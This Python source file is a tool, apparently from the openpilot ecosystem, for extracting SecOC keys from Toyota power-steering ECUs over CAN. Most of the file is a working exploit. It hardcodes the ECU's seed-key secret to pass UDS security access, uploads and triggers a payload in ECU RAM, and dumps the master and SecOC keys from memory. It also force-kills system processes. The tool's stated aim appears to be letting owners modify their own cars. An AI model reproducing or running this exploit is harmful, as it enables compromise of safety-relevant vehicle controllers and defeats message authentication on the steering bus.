#!/usr/bin/env python3
import struct
import subprocess
import time
from subprocess import check_output, CalledProcessError

from tsk.lib import preflight_store
from tsk.lib.env import is_agnos, PAYLOAD_PATH


class NotAGNOSError(Exception):
  def __str__(self) -> str:
    return "Can't run TSK Extractor outside of a comma device."


class BoarddNotRunningError(Exception):
  pass


class RetryError(Exception):
  def __init__(self, message: str):
    self.message: str = message

  def __str__(self) -> str:
    return f"{self.message}\n\nTry again. If the problem persists, turn off the car, put it back into 'Not Ready to Drive' mode, and then try again."


class SecurityAccessError(RetryError):
  """A security-access failure, carrying which call failed and the ECU's own code.

  Subclasses RetryError so every existing `except RetryError` keeps catching it, but
  overrides __str__ to drop the inherited "Try again..." tail: a key the ECU received
  and rejected is the one failure where retrying is the wrong advice.
  """
  def __init__(self, message, call, exception_name, service_id=None, error_code=None):
    super().__init__(message)
    self.call = call
    self.exception_name = exception_name
    self.service_id = service_id
    self.error_code = error_code

  def __str__(self) -> str:
    return self.message


class PandaError(Exception):
  pass


def resolve_identity(panda, route=None, ecu_serial=None):
  """(bus, param, ecu_serial) for this run.

  The caller's values win; anything it leaves out comes from the last preflight, and
  from (0, 0) plus `unattributed` when preflight never measured this panda in this
  harness orientation. Any failure to read the panda's identity falls through to that
  same default, which is the pre-preflight behaviour.
  """
  panda_serial = None
  harness_status = None
  try:
    panda_serial = panda.get_serial()[0]
  except Exception:
    pass
  try:
    harness_status = panda.health().get("car_harness_status")
  except Exception:
    pass

  bus, param, stored_serial = preflight_store.identity_for(panda_serial, harness_status)
  if route is not None:
    bus, param = int(route[0]), int(route[1])
  return bus, param, ecu_serial if ecu_serial is not None else stored_serial


def security_access_with_log(uds, ecu_serial=None, caller="extractor", stage_cb=None):
  """REQUEST_SEED, then the gate, then SEND_KEY. Every attempt is recorded.

  Shared by all three unlock paths rather than duplicated per module: the session
  ladders differ per operation and stay separate, but the gate, the key math and the
  log entry are identical, and three copies of a rule about not sending a second key
  is three places to get it wrong.

  stage_cb, when given, is called as stage_cb(name, outcome) for "seed" and "unlock".
  Raises SecurityAccessError on any failure, including a pre-send block.
  """
  from Crypto.Cipher import AES
  from opendbc.car.uds import ACCESS_TYPE, InvalidServiceIdError, InvalidSubAddressError, \
    InvalidSubFunctionError, MessageTimeoutError, NegativeResponseError

  # All five UDS exception types. The three original call sites caught three of them.
  # InvalidSubFunctionError (uds.py:261, raised at :673 while parsing a response)
  # fires AFTER the key is on the wire, so leaving it uncaught would reach an unlock
  # with no log entry. InvalidSubAddressError (:265, raised at :382) cannot fire from
  # here — that raise sits under `if self.rx_sub_addr is not None:` and every TSKM
  # UdsClient is built with four positional arguments, leaving it None — and is
  # caught anyway so the set matches what the callee declares.
  uds_errors = (InvalidServiceIdError, InvalidSubAddressError, InvalidSubFunctionError,
                MessageTimeoutError, NegativeResponseError)

  call_stage = {"request_seed": "seed", "send_key": "unlock"}

  def _fail(call, exc, message):
    outcome, service_id, error_code, name = preflight_store.classify_security_exception(exc)
    preflight_store.record_security_access_attempt(
      ecu_serial, outcome, call, caller, service_id=service_id,
      error_code=error_code, exception=name)
    detail = f"NRC 0x{error_code:02x}" if error_code is not None else name
    if stage_cb:
      stage_cb(call_stage[call], detail)
    return SecurityAccessError(f"{message} ({detail})", call, name,
                               service_id=service_id, error_code=error_code)

  seed_payload = b"\x00" * 16
  try:
    seed = uds.security_access(ACCESS_TYPE.REQUEST_SEED, data_record=seed_payload)
  except uds_errors as e:
    raise _fail("request_seed", e, "Security Access failed") from e
  if stage_cb:
    stage_cb("seed", "received")

  # The gate sits here, immediately before the send, rather than in the UI: hiding or
  # disabling a row stops a tap and nothing else, while a stale page already open on
  # a phone and a direct POST both reach this line on their own.
  if preflight_store.is_unlock_blocked(ecu_serial):
    if stage_cb:
      stage_cb("unlock", "blocked")
    raise SecurityAccessError(preflight_store.block_reason(ecu_serial), "send_key",
                              "Blocked")

  key = AES.new(TSKExtractor.SEED_KEY_SECRET, AES.MODE_ECB).decrypt(seed_payload)
  key = AES.new(key, AES.MODE_ECB).encrypt(seed)
  print(" - SEED:", seed.hex())
  print(" - KEY:", key.hex())

  try:
    uds.security_access(ACCESS_TYPE.SEND_KEY, key)
  except uds_errors as e:
    raise _fail("send_key", e, "Security Access failed") from e

  preflight_store.record_security_access_attempt(ecu_serial, "accepted", "send_key", caller)
  if stage_cb:
    stage_cb("unlock", "accepted")
  return seed, key


def format_version_for_error_display(version1, version2=None, length=8):
  version_str = ""

  version1_str = str(version1)
  if version1_str.startswith("b'"):
    version1_str = version1_str[2:]

  version_str = version1_str[:length]

  if version2 and version1 != version2:
    version2_str = str(version2)
    if version2_str.startswith("b'"):
      version2_str = version2_str[2:]

    version_str += ", " + version2_str[:length]

  return version_str


class TSKExtractor:
  ADDR = 0x7a1
  DEBUG = False

  SEED_KEY_SECRET = b'\xf0\x5f\x36\xb7\xd7\x8c\x03\xe2\x4a\xb4\xfa\xef\x2a\x57\xd0\x44'

  # These are the key and IV used to encrypt the payload in build_payload.py
  DID_201_KEY = b'\x00' * 16
  DID_202_IV = b'\x00' * 16

  # Confirmed working on the following versions
  APPLICATION_VERSIONS = {
    b'\x018965B4209000\x00\x00\x00\x00': b'\x01!!!!!!!!!!!!!!!!',  # 2021 RAV4 Prime
    b'\x018965B4233100\x00\x00\x00\x00': b'\x01!!!!!!!!!!!!!!!!',  # 2023 RAV4 Prime
    b'\x018965B4509100\x00\x00\x00\x00': b'\x01!!!!!!!!!!!!!!!!',  # 2021 Sienna
  }

  KEY_STRUCT_SIZE = 0x20
  CHECKSUM_OFFSET = 0x1d
  SECOC_KEY_SIZE = 0x10
  SECOC_KEY_OFFSET = 0x0c

  _panda = None

  @classmethod
  def _connect_panda(cls):
    """Connect to the panda. The manager's pandad has already flashed the firmware.
    Stash the handle so the caller can close it after the operation (_close_panda)."""
    from panda import Panda

    panda_serials = Panda.list()
    if not panda_serials:
      raise PandaError("No panda found")

    cls._panda = Panda(panda_serials[0])
    return cls._panda

  @classmethod
  def _close_panda(cls) -> None:
    """Close and forget the stashed panda handle, if any. Idempotent. Called from the
    server's finally blocks so extract/dump/collect release the USB handle rather than
    leaking it until GC. Safe because the panda mutex serializes the three operations."""
    panda = cls._panda
    cls._panda = None
    if panda is not None:
      try:
        panda.close()
      except Exception:
        pass

  @classmethod
  def _get_key_struct(cls, data, key_no):
    return data[key_no * cls.KEY_STRUCT_SIZE: (key_no + 1) * cls.KEY_STRUCT_SIZE]

  @classmethod
  def _verify_checksum(cls, key_struct):
    checksum = sum(key_struct[:cls.CHECKSUM_OFFSET])
    checksum = ~checksum & 0xff
    return checksum == key_struct[cls.CHECKSUM_OFFSET]

  @classmethod
  def _get_secoc_key(cls, key_struct):
    return key_struct[cls.SECOC_KEY_OFFSET:cls.SECOC_KEY_OFFSET + cls.SECOC_KEY_SIZE]

  @classmethod
  def hack(cls, route=None, ecu_serial=None, stage_cb=None):
    """Extracts the SecOC key from the EPS ECU via UDS over CAN.

    route, when given, is the (bus, elm327 param) pair to run on; when omitted it
    comes from the last preflight, falling back to (0, 0).
    """
    if not is_agnos():
      raise NotAGNOSError

    from tqdm import tqdm

    from opendbc.car.isotp import isotp_send
    from opendbc.car.structs import CarParams
    from opendbc.car.uds import UdsClient, SESSION_TYPE, DATA_IDENTIFIER_TYPE, SERVICE_TYPE, \
      ROUTINE_CONTROL_TYPE, InvalidServiceIdError, MessageTimeoutError, NegativeResponseError

    # Kill the manager so it doesn't restart pandad during extraction.
    # SIGKILL skips manager_cleanup(), keeping tskweb alive as an orphan.
    # User must reboot after extraction.
    subprocess.run(["pkill", "-9", "-f", "manager.py"], check=False)
    subprocess.run(["pkill", "-9", "-f", "pandad"], check=False)
    time.sleep(2)

    panda = cls._connect_panda()
    route_bus, route_param, ecu_serial = resolve_identity(panda, route, ecu_serial)
    panda.set_safety_mode(CarParams.SafetyModel.elm327, route_param)

    uds_client = UdsClient(panda, cls.ADDR, cls.ADDR + 8, route_bus, timeout=0.1, response_pending_timeout=0.1)

    print("Getting application versions...")

    try:
      app_version = uds_client.read_data_by_identifier(DATA_IDENTIFIER_TYPE.APPLICATION_SOFTWARE_IDENTIFICATION)
      print(f" - APPLICATION_SOFTWARE_IDENTIFICATION (application): {str(app_version)}")
    except (AssertionError, InvalidServiceIdError, MessageTimeoutError, NegativeResponseError):
      raise RetryError("Car not detected")

    if app_version not in cls.APPLICATION_VERSIONS:
      print(f"Unexpected application version (ignored): {str(app_version)}")

    # Mandatory flow of diagnostic sessions
    try:
      uds_client.diagnostic_session_control(SESSION_TYPE.DEFAULT)
      uds_client.diagnostic_session_control(SESSION_TYPE.EXTENDED_DIAGNOSTIC)
      uds_client.diagnostic_session_control(SESSION_TYPE.PROGRAMMING)
      uds_client.diagnostic_session_control(SESSION_TYPE.DEFAULT)
      uds_client.diagnostic_session_control(SESSION_TYPE.EXTENDED_DIAGNOSTIC)
    except (InvalidServiceIdError, MessageTimeoutError, NegativeResponseError):
      raise RetryError("Car not in 'Not Ready To Drive' mode")

    # Get bootloader version
    try:
      bl_version = uds_client.read_data_by_identifier(DATA_IDENTIFIER_TYPE.APPLICATION_SOFTWARE_IDENTIFICATION)
    except (AssertionError, InvalidServiceIdError, MessageTimeoutError, NegativeResponseError):
      raise RetryError(f"Can't read bootloader version ({format_version_for_error_display(app_version)})")
    print(f" - APPLICATION_SOFTWARE_IDENTIFICATION (bootloader) {str(bl_version)}")

    try:
      if bl_version != cls.APPLICATION_VERSIONS[app_version]:
        print(f"Unexpected bootloader version (ignored): {str(bl_version)}")
    except KeyError as e: # In case app_version is not found at all
      print(f"Unexpected bootloader version (ignored): {str(e)}")

    # Go back to programming session
    try:
      uds_client.diagnostic_session_control(SESSION_TYPE.PROGRAMMING)
    except (InvalidServiceIdError, MessageTimeoutError, NegativeResponseError):
      raise RetryError("Can't enter programming session for reading bootloader version")

    # Security Access - request seed, gate, send key. Every attempt is logged.
    print("\nSecurity Access...")
    security_access_with_log(uds_client, ecu_serial=ecu_serial, caller="extractor",
                             stage_cb=stage_cb)
    print(" - Key OK!")

    print("\nPreparing to upload payload...")

    try:
      # Write something to DID 203, not sure why but needed for state machine
      uds_client.write_data_by_identifier(0x203, b"\x00" * 5)

      # Write KEY and IV to DID 201/202, prerequisite for request download
      print(" - Write data by identifier 0x201", cls.DID_201_KEY.hex())
      uds_client.write_data_by_identifier(0x201, cls.DID_201_KEY)

      print(" - Write data by identifier 0x202", cls.DID_202_IV.hex())
      uds_client.write_data_by_identifier(0x202, cls.DID_202_IV)

      # Request download to RAM
      data = b"\x01"  # [1] Format
      data += b"\x46"  # [2] 4 size bytes, 6 address bytes
      data += b"\x01"  # [3] memoryIdentifier
      data += b"\x00"  # [4]
      data += struct.pack('!I', 0xfebf0000)  # [5] Address
      data += struct.pack('!I', 0x1000)  # [9] Size

      print("\nUpload payload...")

      print(" - Request download")
      resp = uds_client._uds_request(SERVICE_TYPE.REQUEST_DOWNLOAD, data=data)

      # Upload payload
      payload = open(PAYLOAD_PATH, "rb").read()
      assert len(payload) == 0x1000
      chunk_size = 0x400
      for i in range(len(payload) // chunk_size):
        print(f" - Transfer data {i}")
        uds_client.transfer_data(i + 1, payload[i * chunk_size:(i + 1) * chunk_size])

      uds_client.request_transfer_exit()

      print("\nVerify payload...")

      # Routine control 0x10f0
      # [0] 0x31 (routine control)
      # [1] 0x01 (start)
      # [2] 0x10f0 (routine identifier)
      # [4] 0x45 (format, 4 size bytes, 5 address bytes)
      # [5] 0x0
      # [6] mem addr
      # [10] mem addr
      data = b"\x45\x00"
      data += struct.pack('!I', 0xfebf0000)
      data += struct.pack('!I', 0x1000)

      uds_client.routine_control(ROUTINE_CONTROL_TYPE.START, 0x10f0, data)
      print(" - Routine control 0x10f0 OK!")

    except (InvalidServiceIdError, MessageTimeoutError, NegativeResponseError):
      raise RetryError("Payload upload failed")

    print("\nTrigger payload...")

    # Now we trigger the payload by trying to erase
    # [0] 0x31 (routine control)
    # [1] 0x01 (start)
    # [2] 0xff00 (routine identifier)
    # [4] 0x45 (format, 4 size bytes, 5 address bytes)
    # [5] 0x0
    # [6] mem addr
    # [10] mem addr
    data = b"\x45\x00"
    data += struct.pack('!I', 0xe0000)
    data += struct.pack('!I', 0x8000)

    # Manually send so we don't get stuck waiting for the response
    erase = b"\x31\x01\xff\x00" + data
    isotp_send(panda, erase, cls.ADDR, bus=route_bus)

    print("\nDumping keys...")
    start = 0xfebe6e34
    end = 0xfebe6ff4

    start_time = time.time()
    timeout = 30

    extracted = b""

    with tqdm(total=end - start) as pbar:
      while start < end:

        current_time = time.time()
        if current_time - start_time > timeout:
          raise RetryError("Key dumping timed out")

        for addr, *_, data, bus in panda.can_recv():
          if bus != route_bus:
            continue

          if data == b"\x03\x7f\x31\x78\x00\x00\x00\x00":  # Skip response pending
            continue

          if addr != cls.ADDR + 8:
            continue

          if cls.DEBUG:
            print(f"{data.hex()}")

          ptr = struct.unpack("<I", data[:4])[0]
          assert (ptr >> 8) == start & 0xffffff  # Check lower 24 bits of address

          extracted += data[4:]

          start += 4
          pbar.update(4)

          start_time = time.time()

    key_1_ok = cls._verify_checksum(cls._get_key_struct(extracted, 1))
    key_4_ok = cls._verify_checksum(cls._get_key_struct(extracted, 4))

    if not key_1_ok or not key_4_ok:
      raise RetryError(f"SecOC key checksum verification failed ({format_version_for_error_display(app_version, bl_version)})")

    key_1 = cls._get_secoc_key(cls._get_key_struct(extracted, 1))
    key_4 = cls._get_secoc_key(cls._get_key_struct(extracted, 4))

    print("\nECU_MASTER_KEY   ", key_1.hex())
    print("SecOC Key (KEY_4)", key_4.hex())

    return key_4.hex()

  @classmethod
  def run(cls, route=None, ecu_serial=None, stage_cb=None):
    try:
      secoc_key = cls.hack(route=route, ecu_serial=ecu_serial, stage_cb=stage_cb)
    except (BoarddNotRunningError, RetryError):
      raise
    except Exception as e:
      e.add_note("\n\n!!!! Unexpected error. Please take a screenshot, post it on #toyota-security, and ping @calvinspark\n")
      raise

    print("SecOC key extracted successfully")
    print("!!!! Take a photo of this screen")
    return secoc_key
